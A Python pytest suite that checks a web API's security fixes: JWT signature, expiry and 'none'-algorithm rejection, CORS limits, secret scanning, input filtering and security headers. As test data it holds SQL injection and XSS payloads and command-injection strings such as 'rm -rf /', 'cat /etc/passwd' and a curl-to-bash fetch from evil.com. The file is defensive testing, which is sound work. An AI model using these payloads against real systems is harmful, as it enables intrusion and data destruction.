"""
Comprehensive Security Validation Test Suite
Tests all security fixes for critical vulnerabilities
"""

import pytest
import jwt
import json
import time
from datetime import datetime, timedelta, timezone
from unittest.mock import patch, MagicMock
from fastapi.testclient import TestClient
from fastapi import FastAPI, HTTPException


# Test fixtures for JWT tokens
def create_valid_token(secret: str = "test-secret-key", exp_minutes: int = 60) -> str:
    """Create a valid JWT token for testing."""
    payload = {
        "sub": "test-user-123",
        "email": "test@example.com",
        "role": "authenticated",
        "iat": datetime.now(timezone.utc),
        "exp": datetime.now(timezone.utc) + timedelta(minutes=exp_minutes),
    }
    return jwt.encode(payload, secret, algorithm="HS256")


def create_invalid_token() -> str:
    """Create a token with invalid signature."""
    payload = {
        "sub": "malicious-user",
        "email": "hacker@evil.com",
        "role": "admin",
        "iat": datetime.now(timezone.utc),
        "exp": datetime.now(timezone.utc) + timedelta(minutes=60),
    }
    # Sign with wrong secret
    return jwt.encode(payload, "wrong-secret", algorithm="HS256")


def create_expired_token(secret: str = "test-secret-key") -> str:
    """Create an expired JWT token."""
    payload = {
        "sub": "test-user-123",
        "email": "test@example.com",
        "role": "authenticated",
        "iat": datetime.now(timezone.utc) - timedelta(hours=25),
        "exp": datetime.now(timezone.utc) - timedelta(hours=1),  # Expired
    }
    return jwt.encode(payload, secret, algorithm="HS256")


def create_no_signature_token() -> str:
    """Create a token without signature verification (algorithm=none attack)."""
    # This simulates the JWT "none" algorithm vulnerability
    header = {"alg": "none", "typ": "JWT"}
    payload = {
        "sub": "attacker",
        "email": "attacker@evil.com",
        "role": "admin",
        "iat": datetime.now(timezone.utc),
        "exp": datetime.now(timezone.utc) + timedelta(minutes=60),
    }
    # Manually construct token without signature
    import base64

    header_b64 = (
        base64.urlsafe_b64encode(json.dumps(header).encode()).rstrip(b"=").decode()
    )
    payload_b64 = (
        base64.urlsafe_b64encode(json.dumps(payload, default=str).encode())
        .rstrip(b"=")
        .decode()
    )
    return f"{header_b64}.{payload_b64}."


class TestJWTAuthentication:
    """Test JWT authentication security fixes."""

    @pytest.fixture
    def mock_settings(self):
        """Mock settings for testing."""
        settings = MagicMock()
        settings.jwt_secret = "test-secret-key"
        settings.supabase_jwt_secret = "test-secret-key"
        settings.supabase_url = "https://test.supabase.co"
        settings.supabase_anon_key = "test-anon-key"
        settings.environment = "production"
        return settings

    def test_jwt_signature_validation_enabled(self, mock_settings):
        """Test that JWT signature validation is properly enabled."""
        from middleware.auth_middleware import AuthenticationMiddleware

        with patch(
            "middleware.auth_middleware.get_settings", return_value=mock_settings
        ):
            middleware = AuthenticationMiddleware(MagicMock())

            # Test with valid token
            valid_token = create_valid_token(mock_settings.jwt_secret)
            result = pytest.helpers.run_async(middleware._validate_token(valid_token))
            assert result is not None
            assert result["authenticated"] == True
            assert result["user_id"] == "test-user-123"

            # Test with invalid signature
            invalid_token = create_invalid_token()
            result = pytest.helpers.run_async(middleware._validate_token(invalid_token))
            assert result is None  # Should reject invalid signature

    def test_jwt_expiration_validation(self, mock_settings):
        """Test JWT expiration is properly validated."""
        from middleware.auth_middleware import AuthenticationMiddleware

        with patch(
            "middleware.auth_middleware.get_settings", return_value=mock_settings
        ):
            middleware = AuthenticationMiddleware(MagicMock())

            # Test with expired token
            expired_token = create_expired_token(mock_settings.jwt_secret)
            result = pytest.helpers.run_async(middleware._validate_token(expired_token))
            assert result is None  # Should reject expired token

    def test_jwt_none_algorithm_attack_prevented(self, mock_settings):
        """Test prevention of JWT 'none' algorithm attack."""
        from middleware.auth_middleware import AuthenticationMiddleware

        with patch(
            "middleware.auth_middleware.get_settings", return_value=mock_settings
        ):
            middleware = AuthenticationMiddleware(MagicMock())

            # Test with no-signature token (none algorithm)
            none_token = create_no_signature_token()
            result = pytest.helpers.run_async(middleware._validate_token(none_token))
            assert result is None  # Should reject tokens without proper signature

    def test_jwt_required_claims_validation(self, mock_settings):
        """Test that required JWT claims are validated."""
        from middleware.auth_middleware import AuthenticationMiddleware

        with patch(
            "middleware.auth_middleware.get_settings", return_value=mock_settings
        ):
            middleware = AuthenticationMiddleware(MagicMock())

            # Token missing 'sub' claim
            payload = {
                "email": "test@example.com",
                "role": "authenticated",
                "iat": datetime.now(timezone.utc),
                "exp": datetime.now(timezone.utc) + timedelta(minutes=60),
            }
            token = jwt.encode(payload, mock_settings.jwt_secret, algorithm="HS256")
            result = pytest.helpers.run_async(middleware._validate_token(token))
            assert result is None  # Should reject tokens missing required claims

    def test_jwt_token_age_validation(self, mock_settings):
        """Test JWT token age validation (24-hour limit)."""
        from middleware.auth_middleware import AuthenticationMiddleware

        with patch(
            "middleware.auth_middleware.get_settings", return_value=mock_settings
        ):
            middleware = AuthenticationMiddleware(MagicMock())

            # Token older than 24 hours but not expired
            old_iat = datetime.now(timezone.utc) - timedelta(hours=25)
            payload = {
                "sub": "test-user-123",
                "email": "test@example.com",
                "role": "authenticated",
                "iat": old_iat,
                "exp": datetime.now(timezone.utc)
                + timedelta(minutes=10),  # Still valid
            }
            old_token = jwt.encode(payload, mock_settings.jwt_secret, algorithm="HS256")
            result = pytest.helpers.run_async(middleware._validate_token(old_token))
            assert result is None  # Should reject tokens older than 24 hours


class TestCORSConfiguration:
    """Test CORS security configuration."""

    def test_cors_wildcard_origins_removed(self):
        """Test that wildcard (*) CORS origins are not allowed."""
        from config.settings import Settings
        from main import create_application

        # Test production settings don't allow wildcards
        with patch.dict("os.environ", {"ENVIRONMENT": "production"}):
            settings = Settings()
            assert "*" not in settings.allowed_origins
            assert (
                "http://localhost:3000" in settings.allowed_origins
                or len(settings.allowed_origins) > 0
            )

    def test_cors_specific_origins_configured(self):
        """Test that specific origins are properly configured."""
        from main import create_application

        app = create_application()

        # Check CORS middleware configuration
        cors_middleware = None
        for middleware in app.middleware:
            if (
                hasattr(middleware, "cls")
                and middleware.cls.__name__ == "CORSMiddleware"
            ):
                cors_middleware = middleware
                break

        assert cors_middleware is not None
        # Verify no wildcard in allow_origins
        assert "*" not in middleware.options.get("allow_origins", [])

    def test_cors_headers_properly_configured(self):
        """Test CORS headers are properly configured."""
        from main import create_application

        app = create_application()

        # Find CORS middleware configuration
        for middleware in app.middleware:
            if (
                hasattr(middleware, "cls")
                and middleware.cls.__name__ == "CORSMiddleware"
            ):
                options = middleware.options
                # Check explicit headers (no wildcards)
                assert "*" not in options.get("allow_headers", [])
                assert "Authorization" in options.get("allow_headers", [])
                # Check explicit methods
                assert "*" not in options.get("allow_methods", [])
                assert "GET" in options.get("allow_methods", [])
                break


class TestSecretsManagement:
    """Test secrets management security."""

    def test_no_hardcoded_secrets_in_code(self):
        """Test that no hardcoded secrets exist in production code."""
        import os
        import re

        # Patterns that indicate hardcoded secrets
        secret_patterns = [
            r'api[_-]?key\s*=\s*["\']sk-[a-zA-Z0-9]{20,}',  # OpenAI keys
            r'password\s*=\s*["\'][^"\']+["\']',  # Hardcoded passwords
            r'secret[_-]?key\s*=\s*["\'][^"\']+["\']',  # Secret keys
            r'token\s*=\s*["\'][a-zA-Z0-9]{20,}["\']',  # Hardcoded tokens
        ]

        # Files to check (exclude test files)
        code_files = []
        for root, dirs, files in os.walk("."):
            # Skip test directories
            if "test" in root or "__pycache__" in root or "venv" in root:
                continue
            for file in files:
                if file.endswith(".py"):
                    code_files.append(os.path.join(root, file))

        violations = []
        for filepath in code_files:
            if not os.path.exists(filepath):
                continue
            with open(filepath, "r") as f:
                content = f.read()
                for pattern in secret_patterns:
                    if re.search(pattern, content):
                        violations.append((filepath, pattern))

        # Assert no violations found
        assert len(violations) == 0, f"Hardcoded secrets found in: {violations}"

    def test_environment_variable_loading(self):
        """Test that secrets are loaded from environment variables."""
        from config.settings import Settings

        # Test with environment variables
        test_env = {
            "JWT_SECRET": "test-jwt-secret-from-env",
            "SUPABASE_ANON_KEY": "test-supabase-key-from-env",
            "OPENAI_API_KEY": "sk-test-from-env",
        }

        with patch.dict("os.environ", test_env, clear=False):
            settings = Settings()
            assert settings.jwt_secret == "test-jwt-secret-from-env"
            assert settings.supabase_anon_key == "test-supabase-key-from-env"

    def test_gitignore_configured_properly(self):
        """Test that .gitignore properly excludes sensitive files."""
        expected_patterns = [
            ".env",
            "*.key",
            "*.pem",
            "*.p12",
            "secrets/",
            "credentials/",
        ]

        gitignore_path = ".gitignore"
        if os.path.exists(gitignore_path):
            with open(gitignore_path, "r") as f:
                content = f.read()
                for pattern in expected_patterns:
                    assert (
                        pattern in content or pattern.strip("*") in content
                    ), f"Pattern {pattern} not found in .gitignore"


class TestInputValidation:
    """Test input validation and injection prevention."""

    def test_sql_injection_prevention(self):
        """Test SQL injection prevention in security middleware."""
        from middleware.security_middleware import SecurityMiddleware

        middleware = SecurityMiddleware(MagicMock())

        # Test SQL injection patterns are detected
        sql_payloads = [
            "'; DROP TABLE users; --",
            "1 OR 1=1",
            "' UNION SELECT * FROM passwords --",
            "admin' --",
            "1; DELETE FROM documents WHERE 1=1",
        ]

        for payload in sql_payloads:
            with pytest.raises(HTTPException) as exc_info:
                middleware._check_patterns(payload, "test input")
            assert exc_info.value.status_code == 400
            assert "Malicious content detected" in str(exc_info.value.detail)

    def test_xss_prevention(self):
        """Test XSS attack prevention."""
        from middleware.security_middleware import SecurityMiddleware

        middleware = SecurityMiddleware(MagicMock())

        # Test XSS patterns are detected
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "javascript:alert(1)",
            "<img src=x onerror=alert(1)>",
            "<body onload=alert('XSS')>",
            "';alert(String.fromCharCode(88,83,83))//",
        ]

        for payload in xss_payloads:
            with pytest.raises(HTTPException) as exc_info:
                middleware._check_patterns(payload, "test input")
            assert exc_info.value.status_code == 400
            assert "Malicious content detected" in str(exc_info.value.detail)

    def test_command_injection_prevention(self):
        """Test command injection prevention."""
        from middleware.security_middleware import SecurityMiddleware

        middleware = SecurityMiddleware(MagicMock())

        # Test command injection patterns are detected
        cmd_payloads = [
            "; ls -la",
            "| whoami",
            "&& rm -rf /",
            "`cat /etc/passwd`",
            "$(curl evil.com/shell.sh | bash)",
        ]

        for payload in cmd_payloads:
            with pytest.raises(HTTPException) as exc_info:
                middleware._check_patterns(payload, "test input")
            assert exc_info.value.status_code == 400
            assert "Malicious content detected" in str(exc_info.value.detail)

    def test_input_sanitization(self):
        """Test input sanitization functions."""
        from middleware.security_middleware import InputSanitizationMixin

        mixin = InputSanitizationMixin()

        # Test HTML sanitization
        html_input = "<script>alert('XSS')</script>"
        sanitized = mixin.sanitize_html(html_input)
        assert "<script>" not in sanitized
        assert "&lt;script&gt;" in sanitized

        # Test SQL input sanitization
        sql_input = "'; DROP TABLE users; --"
        sanitized = mixin.sanitize_sql_input(sql_input)
        assert "'" not in sanitized
        assert "--" not in sanitized

        # Test filename validation
        assert mixin.validate_filename("document.pdf") == True
        assert mixin.validate_filename("../../etc/passwd") == False
        assert mixin.validate_filename("malware.exe") == False
        assert mixin.validate_filename("script.sh") == False


class TestSecurityHeaders:
    """Test security headers implementation."""

    def test_security_headers_present(self):
        """Test that all required security headers are present."""
        from middleware.security_middleware import SecurityMiddleware
        from fastapi import Request, Response

        middleware = SecurityMiddleware(MagicMock())
        response = Response()
        request = MagicMock(spec=Request)

        # Add security headers
        middleware._add_security_headers(response, request)

        # Check required headers
        assert response.headers["X-Content-Type-Options"] == "nosniff"
        assert response.headers["X-Frame-Options"] == "DENY"
        assert response.headers["X-XSS-Protection"] == "1; mode=block"
        assert response.headers["Referrer-Policy"] == "strict-origin-when-cross-origin"
        assert response.headers["X-Download-Options"] == "noopen"
        assert response.headers["X-Permitted-Cross-Domain-Policies"] == "none"

    def test_content_security_policy(self):
        """Test Content Security Policy header."""
        from middleware.security_middleware import SecurityMiddleware
        from fastapi import Request, Response

        # Test production CSP
        with patch("middleware.security_middleware.get_settings") as mock_settings:
            mock_settings.return_value.environment = "production"

            middleware = SecurityMiddleware(MagicMock())
            response = Response()
            request = MagicMock(spec=Request)

            middleware._add_security_headers(response, request)

            csp = response.headers.get("Content-Security-Policy", "")
            assert "default-src 'self'" in csp
            assert "frame-ancestors 'none'" in csp
            assert "base-uri 'self'" in csp

    def test_hsts_header_in_production(self):
        """Test HSTS header is set in production."""
        from middleware.security_middleware import SecurityMiddleware
        from fastapi import Request, Response

        with patch("middleware.security_middleware.get_settings") as mock_settings:
            mock_settings.return_value.environment = "production"

            middleware = SecurityMiddleware(MagicMock())
            response = Response()
            request = MagicMock(spec=Request)

            middleware._add_security_headers(response, request)

            hsts = response.headers.get("Strict-Transport-Security", "")
            assert "max-age=31536000" in hsts
            assert "includeSubDomains" in hsts
            assert "preload" in hsts


# Helper for async tests
class PytestHelpers:
    @staticmethod
    def run_async(coro):
        """Helper to run async functions in tests."""
        import asyncio

        loop = asyncio.get_event_loop()
        return loop.run_until_complete(coro)


pytest.helpers = PytestHelpers()


if __name__ == "__main__":
    # Run the tests
    pytest.main([__file__, "-v", "--tb=short"])
